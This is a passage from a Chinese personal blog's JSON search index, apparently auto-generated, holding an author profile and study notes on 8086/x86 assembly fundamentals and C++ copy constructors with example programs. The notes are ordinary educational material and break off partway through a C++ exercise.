{"pages":[{"title":"404 Not Found：该页无法显示","text":"","link":"/404.html"},{"title":"关于","text":"12345678910111213141516{ personalInformation: { name: &quot;sYstemk1t&quot;, age: 22, gender: &quot;男&quot;, experience: &quot;1年&quot;, address: &quot;陕西&quot;, education: &quot;本科&quot;, email: &quot;sYstemk1t@126.com&quot;, description: &quot;职业给大佬端茶递水&quot;, }, skills: [ [&quot;C++&quot;, &quot;Python&quot;, &quot;Java&quot;, &quot;C&quot;, &quot;Win32&quot;], [&quot;Linux&quot;] ]}","link":"/about/index.html"},{"title":"书单","text":"","link":"/books/index.html"},{"title":"分类","text":"","link":"/categories/index.html"},{"title":"友情链接","text":"","link":"/links/index.html"},{"title":"Repositories","text":"","link":"/repository/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}],"posts":[{"title":"Assembly-1","text":"机器指令、指令和数据、二进制和内存编号、cpu对存储器的读写、地址总线、数据总线、控制总线、总结、内存地址空间、主板、接口卡、各类存储器芯片、内存地址空间 机器指令机器指令就是一串二进制数字，计算机在内部帮助我们做了什么事情呢，计算机会将这些二进制数字转换成高低点评，然后驱动计算机部件运行 CPU中央处理器 B4H 40H 1011 0100 0100 0000 –&gt; 机器指令 mov ah,40H （汇编指令） CDH 21H 1100 1101 0010 0001 –&gt; 机器指令 int 21H （汇编指令） 机器指令的弱点：万一写错一位数字，改起来是灾难 汇编指令更加贴近人类的思维。 mov 移动指令 将40H移动到 一个叫AH的寄存器中 将汇编指令翻译为机器指令的软件称为编译器 汇编指令 –&gt; 翻译器 –&gt;010101010101 伪指令 –&gt; 告诉翻译器，这里如何进行翻译，下一步如何进行翻译 没有对应的机器指令 符号体系 –&gt; +、-、*、/ 没有对应的机器指令，由翻译器执行 指令和数据CPU通过指令来控制整个计算机 计算机内部有很多部件，它们都是有不同的分工的 引入内存的概念： CPU在工作时需要对指令和数据进行区分 指令和数据以什么形式存放在内存中： 二进制方式存放在内存中，但是展示的时候，以十六进制进行展示 内存的最小存储单元：字节（byte） = 2个十六进制数字 = 8个二进制数字 bit 比特 1字节 = 8比特 对存储单元进行编号方式：从0开始计数 1byte = 8bit 1kb = 1024byte 1mb = 1024kb 1gb = 1024mb 1tb = 1024gb cpu通过内存的读写控制计算机 问题： ​ 机器指令&lt;汇编指令&gt;和数据存放在哪里？ 内存 （存储器） ​ 机器指令&lt;汇编指令&gt;和数据是以什么形式存在的？ 二进制方式，展示的时候以十六进制方式 ​ 内存（存储器编号）是怎么计算的？ 由低到高，从0开始 ​ 内存的计量单位？ byte 在cpu中，用16位来存储一个字，高8位存放高字节，低8位存放低位字节。 二进制和内存编号存储器被划分成若干个存储单元，，每个存储单元从0开始排号 计算机中的最小单位信息的bit(比特),也就是一个二进制位 一个存储单元能存储一个Byte，即八个二进制位 一个存储器中有128个存储单元，可以存储128个Byte cpu对存储器的读写存储单元的地址（地址信息） 器件的选择，独活写的命令(控制信息) 独活写的数据(数据信息) 地址总线10根地址线的CPU向内存发出地址信息11时10根线上传递的二进制信息 访问地址为12： 0000001100 访问地址为13： 0000001101 访问地址为14： 0000001110 数据总线8088CPU的数据总线宽度为8，8086CPU的数据总线宽度为16. 例如传递数据为89D8H的时候，他就会把数据分开传输。 8088CPU分两次传输，第一次传输D8，第二次传输89. 8086CPU传输，他有16根数据线，可一次传输16位数据，所以可以一次性传输 控制总线CPU对外部器件的控制是通过控制总线来进行的 总结1.汇编指令是机器指令的助记符，同机器指令–对应 2.每一种CPU都有自己的汇编指令集 比如intel amd arm 3.CPU可以直接使用的信息在存储器中存放 4.在存储器中指令和数据没有任何区别，都是二进制信息 5.存储单元从零开始排序 6.一个存储单元存储8个bit，即8个二进制数，也称8个二进制位 7.1Byte = 8bit 1kb = 1024B 1MB = 1024KB 1GB = 1024MB 1TB = 1024 MB 转换 8.每一个CPU芯片都有许多管脚，这些管教和总线相连。也可以说，这些管脚引出总线，一个CPU可以引出三种总线的宽度标志了这个CPU的不同方面的性能 ​ 地址总线的宽度决定了CPU的寻址能力 ​ 数据总线的宽度决定了CPU与其他器件进行数据传送时一次数据传送量 ​ 控制总线的宽度决定了CPU对系统中其他器件的控制能力 内存地址空间一个CPU的地址总线宽度为10，那么可以寻址1024个内存单元，这1024个可寻到的内存单元构成了这个CPU的内存地址空间 主板每一个PC机器中，都有一个主板，主板上有核心几千和一些主要器件，这些器件通过三条总线（地址总线、数据总线、控制总线）相连。 接口卡CPU对外部设备不能直接控制，如显示器、音响等，直接控制这些设备工作的是插在扩展插槽上的接口卡。 扩展插槽通过总线和CPU相连，所以接口卡也通过总线同CPU相连。 各类存储器芯片随机存储器：主随机存储器一般由两个位置上的RAM组成，装在主板上的RAM和插在扩展槽上的RAM。 装有BIOS的ROM：例如主板上的ROM中存储着主板的BIOS（俗称BIOS芯片） 接口卡上RAM：最典型的就是显卡上的RAM，一般称为显存，显卡的显存越大，一般来说，打游戏越流畅。 内存地址空间上述的存储器都是在物理上独立的器件。 都和cpu总线相连 cpu对他们进行读写的时候通过控制线发出内存读写命令 这也就是说，cpu在操纵他们的时候，都是把他们当作内存来处理的，把他们看成一个由多个存储单元组成的逻辑存储器，这个逻辑存储器就是我们所属的内存地址空间。 所有的物理存储器都被看做一个或多个存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。 cpu在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。 8086PC机内存地址分配表 最终运行程序的是CPU，对CPU来说，系统中所有存储器中的存储单元都处于一个统计的逻辑存储器中，它的容量受CPU寻址能力的限制，这个逻辑存储器就是我们通常说的内存地址空间","link":"/2019/08/22/Assembly-1/"},{"title":"Assembly-2","text":"寄存器、通用寄存器、字在存储器中的存储、汇编指令、物理地址、16位CPU的结构、8086CPU给出物理地址的方法、段地址*16+偏移地址、段的概念、段寄存器、cs和ip、修改cs和ip 寄存器一个典型的CPU是由运算器、控制器、寄存器等器件构成，这些器件靠内部总线相连 运算器进行信息处理 寄存器进行信息存储 控制器控制各种器件进行工作 内部总线连接各种器件，在他们之间进行数据的传递 不同的cpu，寄存器的个数和结构是不同的 通用寄存器8086cpu的所有的寄存器都是16位，可以存放两个字节，AX、BX、CX、DX这四个寄存器通常用来存放一般性的数据，被称为通用寄存器 AX为例，寄存器的逻辑结构如图 一个16位寄存器可以存储一个16位的数据。 一个16位寄存器所能存储的数据最大值为2^16-1，即65535 为了兼容上一代CPU，8086cpu的AX、BX、CX、DX这四个寄存器都可分为两个独立使用的8位寄存器 AX可分为AH和AL BX可分为BH和BL CX可分为CH和CL DX可分为DH和DL 数据18在寄存器AX中存储 首先把18转换二进制 18 = 0001 0010 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 寄存器16位 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 0 数据存储方式，二进制方式 以AX为例子 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 16位寄存器 AH（高八位） AL（低八位） 7 6 5 4 3 2 1 0 7 6 5 4 3 2 1 0 8位寄存器 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 0 8位寄存器中的数据表示 AX的低八位(07)构成了AL存储器，高8位(815)构成了AH存储器。 AH和AL寄存器都是可以独立使用的八位寄存器 一个八位寄存器所能存储的数据最大值是255 字在存储器中的存储字节：记byte，一个字节由8个bit组成，可以存在8位寄存器中。 字：记word，一个字由两个字节组成，这两个字节分别成为这个字的高位字节和低位字节 高位字节 低位字节 0 1 0 0 1 1 1 0 0 0 1 0 0 0 0 0 一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高八位寄存器和低八位寄存器中。 任何数据，到了计算机中都是以二进制的方式存在的 十六进制数的一位相当于二进制数的四位，如0100 1110 0010 0000 可以表示为：4(0100)、E(1110) 2(0010)、0(0000) 由于一个内存单元可存放8位数据，CPU中的寄存器又可以存放n个8位的数据 十六进制后加H，二进制后加B 汇编指令mov ax,18 将18送入寄存器AX mov ah,78 将78送入寄存器AH add ax,8 将寄存器AX中的数据加上8 mov ax,bx 将寄存器变量BX中的数据送入寄存器AX add ax,bx, 将AX和BX中的数值相加，结果存在AX中 指令 执行后AX中的数据 执行后BX中的数据 mov ax,4e20H 4E20H 0000H add ax,1406H 6226H 0000H mov bx,2000H 6226H 2000H add ax,bx 8226H 2000H mov bx,ax 8226H 8226H add ax,bx 044CH 8226H 问题2-1： 因为ax为16位寄存器，只能存放4位16进制的数据，所以最高为1不能在ax中保存。 这里其实有是有一个小坑的，ax和bx都是16位寄存器，al和bl都是八位寄存器。 add al,bl al = 1a,bl = 26 1a+26 = 40 add ah,bl ah = 0 + 26H = 26H; al = 40H, ah+bl = 2640H; add bh,al bh = 0026H; al = 40H; bh+al = 2640H; mov ah,0 意思就是把高八位归为0 add al,85H ax中的低位寄存器加85 ​ 40 + 85 = 00C5 //因为是使用低位寄存器运算 add al,96H al也是一个低八位寄存器 ​ c5 + 93 = 0158 //015为16位寄存器表示方法，8位寄存器中，舍弃掉高位，答案为58 在进行数据传送或运算时，要注意指令的两个操作对象的位数应当是一致的。 错误写法： mov ax,bl //因为一个是八位寄存器，一个是十六进制。 物理地址CPU访问内存单元的时候，要给出内存单元的地址。所有的内存单元构成存储空间是一个一维的线性空间，每一个内存单元 在这个空间都有唯一的地址。 CPU通过地址总线送入存储器的，必须是一个内存单元的物理地址。 16位CPU的结构8086CPU是上一代CPU(8080、8085)等是8位机器，8086是16位，也可以说8086是16位结构的CPU。 16位CPU的结构： ​ 运算器一次最多可以处理16位数据； ​ 寄存器的最大宽度为16； ​ 寄存器和运算器之间的通路为16； 8086CPU给出物理地址的方法8086CPU有20位地址总线 ，可以传送20位地址，达到1MB的寻址能力。 8086CPU又是16位的架构，在内部一次性处理、传输、暂时存储的地址为16位。 从8086CPU的内部结构来看，如果将地址从内部简单发出，那么它只能送出16位地址，表现出的寻址空间只有64KB。 CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址。 段地址和偏移地址通过内部总线送入一个称为地址加法器的部件。 地址加法器将两个十六位地址合成一个二十位的物理地址 地址加法器通过内部总线将二十位的物理地址送入输出控制电路 输入输出控制电路将二十位物理地址送上地址总线 二十位的物理地址被地址总线送到存储器 地址加法器采用物理地址=短地址*16+偏移地址的方法用段地址和偏移地址合成物理地址。 段地址*16计算 十六进制数字:2H 二进制形式为10，左移运算 左移位数 二进制 十六进制 十进制 0 10B 2H 2 1 100B 4H 4 2 1000B 8H 8 3 10000B 10H 16 4 100000B 20H 32 观察规律： 1个数据的二进制形式左移1位，相当于该数据乘以2 1个数组的二进制形式左移n位，相当于该数据乘以的N次方 地址加法器就是以二进制形式存放的段地址左移4位 一个数据的十六进制形式向左移1位，相当于乘以16； 一个数据的十进制形式向左移1位，相当于乘以10； 一个X禁止的数据左移1位，相当于乘以X； ‘段地址’*16+偏移地址段地址’16+偏移地址 = 物理地址的本质含义是：CPU在访问内存时，用一个基础地址(地址段16)和一个相对于寄存地址的偏移地址相加，给出内存单元的物理地址。 比如说2826这个数据 分开写在两张可以写下三位数据的纸条 200 //第一张 826 //第二张 200是段地址，826是偏移地址 200(段地址)*10+826(偏移地址) = 2826(物理地址) 段的概念内存没有分段，段的划分来自于CPU，由于8086CPU用“基础地址(段地址*16)+偏移地址 = 物理地址”的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存。 比如途中的10000H~100FFH的内存单元组成一个段，该段的起始地址（基础地址）位10000H，段地址位1000H，大小为100H。 将若干地址连续的内存单元看作一个段。 两个需要注意的点： ​ 偏移地址为16位，16位地址的寻址能力位64KB ​ 一个段的长度最大为64KB CPU CPU访问内存单元时，必须像内存提供内存单元的物理地址。8086CPU在内部用段地址和偏移地址移位相加的方法最终形成的物理地址。 CPU可以用不同的段地址和偏移地址来形成统一个物理地址. 数据存在内存2000:1F60单元中； 数据存在内存的2000H段中的1F60H单元中； 段寄存器8086CPU有4个段寄存器：CS、DS、SS、ES； CS和IPCS为代码段寄存器； IP为指令指针寄存器； CS是代码段寄存器，IP是指令指针寄存器（相当于偏移地址）。修改CS、IP的指令不同于修改通用的寄存器值的指令，修改通用寄存器的值可以用mov 指令（mav ax,123），mov指令被称为传送指令。修改CS、IP的指令是jmp指令。jmp指令被称为转移指令。 （1）同时修改代码段寄存器和指令指针寄存器，形如jmp 段地址：偏移地址。 jmp2AE3:3,执行后：CS=2AE3H，IP=0003H,CPU将在2AE33H处读取指令 （2）仅想修改IP的内容，形如“jmp 某一合法寄存器”,功能是用某一合法寄存器中的值修改IP的内容 jmpax，指令执行前：ax=1000H,CS=2000H,IP=0003H 执行后结果：ax=1000H,CS=2000H,IP=1000H。 一般来说，CPU在访问内存的时候要由相关部件提供内存单元的段地址和偏移地址，送入地址加法器合成物理地址。段寄存器提供段地址。8086CPU有4个段寄存器：CS、DS、ES、SS。典型的提供段地址和偏移地址的寄存器为CS和IP寄存器。也就是说，CPU会将CS:IP合成的物理地址指向的内容当作指令执行。CPU执行指令的步骤一般是：（1）将CS、IP中的内容送入地址加法器（段地址*16+偏移地址）合成物理地址。 （2）地址加法器将物理地址送入输入输出控制电路 （3）输入输出控制电路将物理地址送上地址总线 （4）然后CPU从物理地址指向的内存单元读取机器指令，并将机器指令通过数据总线送入CPU的输入输出控制电路。 （5）输入输出控制电路将读取的指令送入指令缓冲器，同时IP的内容更新为原内容加指令长度。 （6）然后，执行控制器执行机器指令，并将执行后的内容送入相应的寄存器。 在编程时，可以根据需要将一组内存单元定义为一个段。我们可以将长度为N（N&lt;=64KB,因为偏移地址长度为16位，最大为64KB）的一组代码存在一组连续、起始地址为16的倍数的内存单元中。这样，这段内存就可以看成是代码段，用来存放代码的。 在win Xp上做的一个小实验 cmd &gt;&gt; debug 用R命令改变、查看CPU寄存器的内容 用D命令查看内存中的内容 用E命令改写内存中的内容 修改cs、ip指令mov指令不能用于设置CS、IP的值。 使用jmp指令修改CS、IP的值。","link":"/2019/08/22/Assembly-2/"},{"title":"Assembly-x86-1","text":"基本概念 虚拟机概念计算机通常可以执行用其原生机器语言编程的程序，这种语言中的每一条指令都见到到可以用相对少量的电子电路来执行。这种语言为L0，L0只由数字组成； 那么假设现在有程序L1，它的实现方法： 解释：运行L1的时候，每一条指令都由一个用L0语言编写的程序进行译码和执行。 翻译：由一个专门设计的L0程序将整个L1程序转换为L0程序。 虚拟机每一个虚拟机既可以用硬件构成也可以由软件构成。 特定的机器 分层： 指令集架构（Level2）：芯片厂商在内部设计指令集来实现基本操作。也被称为机器语言。 汇编语言（Level3）：在ias曾，编程语言提供了一个翻译层，汇编语言出现在第三层，使用助记符。汇编语言程序在执行前要全部翻译（汇编）为机器语言。 高级语言（Level4）：高级语言，这些语言程序所包含功能强大， 并且可以翻译为多条汇编指令。 数据表示二进制数被用于描述计算机内存的内容，也可以使用八进制和十六进制； 二进制整数二进制整数是有分为有符号整数和无符号整数，有符号整数分为正整数和负整数，无符号整数默认为整数，零也可以被看做正数。 整数存储大小 1k：2^10，1024个字节 1MB：2^20，或1048576个字节 1GB：2^30，或1024^3 有符号的二进制整数最低位表示符号位：0表示整数，1表示复数 补码表示： 一个二进制整数按位取反在加1，就得到了它的补码。 有符号十进制数到二进制的转换 把十进制整数的绝对值转换为二进制 如果初始十进制数是负数，在第一步的进出上，求该二进制数的补码 无符号数43的二进制表示位00101011 由于初始数值是负数，因此求出00101011的补码是11010101。 字节存储 UTF-8：用于HTML，与ASCII有相同的字节数值。 UTF-16：用于介于使用内存与搞笑访问字节互相平衡的环境中。 UTF-32:用于不考虑空间，但需要固定宽度字节的环境中 ASCII字符串：有一个或多个字节的序列被称为字符串","link":"/2019/09/01/Assembly-x86-1/"},{"title":"Assembly-x86-2","text":"X86处理器架构 概念基本微机设计 时钟对CPU内部操作与系统其他组件进行同步 控制单元（CU）协调参与机器指令控制的步骤序列 算术逻辑单元（ALU）执行算术单元 时钟与cpu和系统相关的每一个操作都是由一个恒定速率的内部时钟脉冲来进行同步。机器指令的基本时间单位是机器周期或时钟周期。一个时钟周期的时长是一个完整时钟脉冲所需的时间。 执行一条指令最少需要一个时钟周期 执行指令周期CPU在执行一条机器指令时，需要经过一系列预先设定好的步骤，这些步骤称为指令周星周期。 CPU从被称为指令队列的内存区域取得指令，之后立即增加指令指针的值 CPU对指令的二进制位模式进行译码 如果有操作数，CPU就从寄存器和内存中取得操作数 使用步骤三得到的操作数，CPU执行该指令。同时更新部分标志位寄存器，如零标志、进位标志、溢出标志 如果输出操作数也是该指令的一部分，则CPU还需要存放其执行结果 读取内存计算机从内存读取数据比从内部寄存器读取速度要慢，因为要从内存读取一个值，需要经过以下步骤： 将想要读取的值的地址放到地址总线上 设置处理器RD引脚 等待一个时钟周期给存储器芯片进行相应 将数据从数据总线负值到目标操作数 每一步都需要一个时钟周期，时钟周期是基于处理器内固定速度时钟节拍的一种时间测量方法 加载并执行程序在程序执行前，需要用一种工具将其加载到内存，这种工具称为程序加载器，加载后，操作系统必须将CPU只想程序的入口，即程序开始执行的地址。 详细步骤： 操作系统在当前磁盘目录下搜索程序的文件名。如果找不到，则会去环境变量（path）中，当操作系统无法检索文件名，则会报错 如果找到文件，OS就会访问磁盘目录中的程序文件基本信息，包括文件大小，及其在磁盘驱动器上的物理位置 OS去欸的那个内存中下一个可使用的位置，将程序文件加载到内存。在为程序分配内存块，并且将程序大小和位置信息加入表中（描述符表）。 OS开始执行程序的第一条机器指令。当程序开始执行后，就成为一个进程（Process），OS为这个进程分配一个标识号（进程id），用于在执行期间对其追踪。 进程自动运行。OS的工作是追踪进程的执行，并相应资源系统的请求。 进程结束后，就会从内存中移除 32位x86处理器x86处理器有三个主要的操作模式：保护模式、实地址模式、和系统管理模式；以及一下子模式，虚拟8086模式 操作模式保护模式：保护模式是处理器的原生状态，这种模式下，所有的指令和特性都是可用的。分配给程序的独立内存区块称为段，而处理器会阻止程序自身段范围以外的内存 虚拟8086模式：保护模式下，处理器可以在一个安全的环境中，直接执行实地址模式软件，如MS-DOS程序。现代操作系统可以同时执行多个独立的虚拟8086会话。 实地址模式：实地址模式实现的是早期Intel处理器的编程环境，但是增加了一些其他的特性，如切换到其他模式的功能。 系统管理模式：系统管理模式是操作系统提供了实现诸如电源管理和系统安全等功能的机制。 基本执行环境1.地址空间 在32位保护模式下，一个任务或程序最大寻址4GB线性内存空间。从P6（P6架构，外部地址总线扩展至36位，处理器的直接寻址能力64GB。采用动态执行技术。），一种称为扩展物理寻址的技术使得可以被寻址的物理内存空间增加到64GB。与之相反，实地址模式程序只能寻址1MB，如果处理器在保护模式下运行多个虚拟8086程序，那么每个程序只能拥有自己的1mb内存空间。 2.基本程序执行寄存器 寄存器是直接位于CPU内部的高速存储位置，其设置访问速度高于传统存储器。 32下有8个通用寄存器，6个段寄存器，1个处理器状态标志寄存器(eflag)和1个指令指针寄存器(eip) 通用寄存器：主要用于算术运算和数据传输，一些通用寄存器的组成部分可以处理8位的值。 可以拆分的寄存器： 不可以拆分的寄存器： 某些通用寄存器特殊用法： 乘除指令默认使用EAX。它常常被称为扩展累加器寄存器。 CPU默认使用ECX为循环计数器。 ESP用于寻址堆栈数据。它极少用于一般算术运算和数据传输，通常被称为扩展堆栈指针寄存器。 ESI和EDI用于告诉存储器传输命令，有时也称为扩展源变址寄存器和扩展目的变址寄存器。 高级语言通过EBP来引用堆栈中的函数参数和局部变量。它不用于一般算术运算和数据传输。它常常被称为扩展帧指针寄存器。 段寄存器：实地址模式中，16位段寄存器表示的是预先分配的内存区域的基址，这个内存区域称为段。保护模式中，16位段寄存器表示的是段描述符表指针。一些段中存放程序指令(代码)，其他段存放变量(数据)，还有一个堆栈段存放的是局部变量和函数参数。 指令指针：指令指针（EIP）寄存器中包含下一条要执行指令的地址。某些机器指令能控制EIP，使得程序分支转向一个新位置。 EFLAGS寄存器：EFLAGS（或Flags）寄存器包含了独立的二进制位，用于控制CPU的控制，或是反映一些CPU操作的结果。有些指令而可以测试和控制这些单独的处理器标志位。 控制标志位：控制标志位控制CPU的操作。例如，它们能使得CPU每执行一条指令后进入中断；在侦测到算术运算溢出时中断执行；进入虚拟8086模式，以及进入保护模式。 状态标志位：状态标志位反映了CPU执行的算术和逻辑运算结果，其中包含： 进位标志位(CF)：与目标位置相比，无符号算术运算结果太大时，设置该标志位 溢出标志位(OF): 与目标位置相比，有符号算术运算结果太大或太小时，设置该标志位 符号标志位(SF)：算术或逻辑操作产生负结果时，设置该标志位 零标志位(ZF)：算术或逻辑操作产生的结果为零时，设置该标志位 辅助进位标志位(AC)：算术操作在8位操作数中产生了位3向位4的进位时，设置该标志位 奇偶校验标志位(PD): 结果的最低有效字节字节包含偶数个1时，设置该值标志位，否则，清楚该标志位。一般是，如果数据有可能被修改或损坏时，该标志位用于进行错误检测 MMX寄存器 在实现高级多媒体和通信应用时，MMX技术提高了Intel处理器的性能。8个64位MMX寄存器支持称为SIMD(单指令，多数据)的特殊指令。 MMX指令对MMX寄存器寄存器中的数据值进行并行操作。 XMM寄存器 x86结构还包括了8个128XMM寄存器，它们被用于SIMD流扩展指令集。 浮点单元：浮点单元执行告诉浮点算术运算。之前为了这个目的，需要一个独立的协处理器芯片。FPU中有8个浮点数寄存器，分别命名为ST(0),ST(1),ST(2)…..。 x86内存管理在实地址模式中，只能寻址1MB内存，地址从00000H到FFFFFH。处理器一次只能运行一个程序，但是可能暂时中断程序来处理来自外围设备的请求(称为中断(intertupt))。应用程序被访问允许访问内存的任意位置，包含哪些直接与系统硬件相关的地址。 MS-DOS操作系统在实地址模式下运行 在保护模式中，处理器可以同时运行多个程序，它的每个进程（运行中的程序）分配总共4GB的内存。每个程序都有分配有自己的保留内存区域，程序之间禁止以外访问其他程序的代码和数据。 在虚拟8086虚拟中，计算机运行在保护模式下，通过创建一个带有1MB地址空间的虚拟8086机器来模拟运行于实地址模式的8086计算机。 64位x86-64处理器x64处理器的基本特征： 向后兼容x86指令集 地址长度为64位，虚拟地址空间2^64字节。按照目前芯片的能录，只能使用到地址的低48位 可以使用64位通用寄存器，允许指令具有64位整数操作数 比x86多了8个通用寄存器 物理地址位48位，支持高达256TB的RAM 当本机运行于64位系统的时候，是不支持16位实模式或者虚拟8086模式的 64位操作系统Intel 64架构引入了一个新的模式，从技术来看，它主要包含两个子模式：兼容模式和64位模式 兼容模式在兼容模式下，现有的16位与32位应用程序不需要重新编译就可以运行在64位操作系统上 64位模式在64位模式下，处理器执行的是使用64位线性地址空间的应用程序 基本64位执行环境64位模式下，虽然处理器现在之恶能支持48位的地址，但是理论上，地址最大为64位，从寄存器来看，64位模式和32位模式最主要的区别如下： 16个64位通用寄存器（32位模式只有8个通用寄存器） 8个80位浮点寄存器 1个64位状态标志寄存器RFLAGS（只使用低32位） 1个64位指令指针寄存器RIP 8个64位MMX寄存器 16个128位XMM寄存器 64位模式下，操作数的默认大小为32位，并且只有8个通用寄存器，但是给每条指令加上REX（扩展寄存器）前缀后，操作数可以达到64位 通用寄存器： 还有一些细节： 64位模式下，单挑指令不能访问寄存器高字节，如AH、BH、CH、DH，以及新字节寄存器下的低字节（如DIL） 64位模式下，32位EFLAGS寄存器由64位RFLAGS寄存器替代，这两个寄存器共享低32位，而RFLAGS的高32位是不适用的 32位模式和64位模式具有相同的状态标志 典型x86计算机组件内存基于Intel的系统使用的是几种基础类型的内存：只读存储器（ROM）、可擦除可编程只读存储器（EPROM）、动态随机访问存储器（DRAM）、静态RAM（SRAM）、图像随机存储器（VRAM）和互补金属氧化物半导体（CMOS）RAM；","link":"/2019/09/02/Assembly-x86-2/"},{"title":"C++ 拷贝构造函数","text":"拷贝构造函数是一种特殊的构造函数，它在创建对象时，是使用同一类中之前创建的对象来初始化新创建的对象。拷贝构造函数通常用于： 通过使用另一个同类型的对象来初始化新创建的对象。 复制对象把它作为参数传递给函数。 复制对象，并从函数返回这个对象。 拷贝构造函数定义1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;using namespace std;class Test{public: Test(int a, int b) { x = a; y = b; cout &lt;&lt; &quot;默认构造函数&quot; &lt;&lt; endl; } Test(const Test &amp; obj) { x = obj.x; y = obj.y; cout &lt;&lt; &quot;拷贝构造函数&quot; &lt;&lt; endl; } ~Test() { cout &lt;&lt; x &lt;&lt; &quot;,&quot; &lt;&lt; y &lt;&lt; &quot;析构函数调用&quot; &lt;&lt; endl; } int GetX() { return x; } int GetY() { return y; }private: int x, y;};void mainobjplay(){ Test A(1, 2); Test B = A; //拷贝构造函数 B = A; //浅拷贝}int main(){ mainobjplay(); return 0;} 匿名对象1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &quot;iostream&quot;using namespace std;class Location { public: Location( int xx = 0 , int yy = 0 ) { X = xx ; Y = yy ; cout &lt;&lt; &quot;Constructor Object.\\n&quot; ; } Location( const Location &amp; p ) //拷贝构造函数 { X = p.X ; Y = p.Y ; cout &lt;&lt; &quot;Copy_constructor called.&quot; &lt;&lt; endl ; } ~Location() { cout &lt;&lt; X &lt;&lt; &quot;,&quot; &lt;&lt; Y &lt;&lt; &quot; Object destroyed.&quot; &lt;&lt; endl ; } int GetX () { return X ; } int GetY () { return Y ; }private : int X , Y ;} ;void f ( Location p ) { cout &lt;&lt; &quot;Funtion:&quot; &lt;&lt; p.GetX() &lt;&lt; &quot;,&quot; &lt;&lt; p.GetY() &lt;&lt; endl ; }Location g(){ Location A(1, 2); return A;}void mainobjplay(){ /* Location B; //这两种调用方式差别很大 B = g(); */ Location B = g(); //将g中的临时变量返回给B，此时b还没有构造，这样就不会调用拷贝构造函数了！ cout &lt;&lt; &quot;test&quot; &lt;&lt; endl;} void main(){ mainobjplay(); system(&quot;pause&quot;);} 如果返回的匿名对象被用来初始化另外一个同类型的类对象，那么匿名对象会直接转成新的对象 深浅拷贝123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;class Name{public: Name(const char* pname) { size = strlen(pname); pName = (char *)malloc(size + 1); strcpy(pName, pname); } Name(Name &amp; obj) { //用obj对象来初始化自己 pName = (char *)malloc(obj.size + 1); strcpy(pName, obj.pName); size = obj.size; } ~Name() { cout &lt;&lt; &quot;开始析构&quot; &lt;&lt; endl; if (pName != NULL) { free(pName); pName = NULL; size = 0; } }private: char *pName; int size;};void playObj(){ Name obj1(&quot;obj1....&quot;); Name obj2 = obj1; cout &lt;&lt; &quot;操作&quot; &lt;&lt; endl;}int main(){ playObj(); return 0;} 构造函数规则123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;#include &lt;string.h&gt;class Test{public: Test(Test &amp; obj) //如果使用了拷贝构造函数，那么C++编译器则不会提供默认的构造函数 { a = obj.a; b = obj.b; cout &lt;&lt; &quot;我是拷贝构造&quot; &lt;&lt; endl; } Test(int x, int y) //使用了有参构造函数后，c++编译器也不会提供默认的构造函数 { a = x; b = y; } ~Test();private: int a; int b;};int main(){ Test t1; //调用失败 return 0;} 当类中没有定义任何构造函数的时候，C++编译器会提供无参构造函数和拷贝构造函数 当类中定义了任意非拷贝构造函数(无参、有参)，C++编译器不会提供无参构造函数 当类中定义了拷贝构造函数时，C++编译器不会提供无参构造函数 默认拷贝构造函数成员变量简单赋值 构造函数初始化列表类中有一个数据成员，并且数据成员类中没有提供默认的构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;class A{public: A(int _a1) { a1 = _a1; } private: int a1;};class B{public: B() :mya(12) { ; } B(int x,int y) :mya(y) { b1 = x; }private: int b1; A mya;};int main(){ A a1(10); B b1(10,20); return 0;} 我们可以尝试给两个类成员进行初始化，中间使用逗号连接； 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class A{public: A(int _a1) { a1 = _a1; } private: int a1;};class B{public: B() :mya(12), mya1(100) { ; } B(int x, int y,int z) :mya(y), mya1(z) { b1 = x; }private: int b1; A mya; A mya1;};int main(){ A a1(10); B b1(10,20,30); return 0;} 构造函数强化练习练习01123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/*1 C++中提供了初始化列表对成员变量进行初始化2 使用初始化列表出现原因：1.必须这样做：如果我们有一个类成员，它本身是一个类或者是一个结构，而且这个成员它只有一个带参数的构造函数，而没有默认构造函数，这时要对这个类成员进行初始化，就必须调用这个类成员的带参数的构造函数，如果没有初始化列表，那么他将无法完成第一步，就会报错。2、类成员中若有const修饰，必须在对象初始化的时候，给const int m 赋值当类成员中含有一个const对象时，或者是一个引用时，他们也必须要通过成员初始化列表进行初始化，因为这两种对象要在声明后马上初始化，而在构造函数中，做的是对他们的赋值，这样是不被允许的。*///总结 构造和析构的调用顺序#include &quot;iostream&quot;using namespace std;class ABC{public: ABC(int a, int b, int c) { this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; printf(&quot;a:%d,b:%d,c:%d \\n&quot;, a, b, c); printf(&quot;ABC construct ..\\n&quot;); } ~ABC() { printf(&quot;a:%d,b:%d,c:%d \\n&quot;, a, b, c); printf(&quot;~ABC() ..\\n&quot;); }protected:private: int a; int b; int c;};class MyD{public: MyD() :abc1(1, 2, 3), abc2(4, 5, 6), m(100) { cout &lt;&lt; &quot;MyD()&quot; &lt;&lt; endl; } ~MyD() { cout &lt;&lt; &quot;~MyD()&quot; &lt;&lt; endl; }protected:private: ABC abc1; //c++编译器不知道如何构造abc1 ABC abc2; const int m;};int run(){ MyD myD; return 0;}int main(){ run(); system(&quot;pause&quot;); return 0;} 练习02123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596//对象做函数参数//1 研究拷贝构造 //2 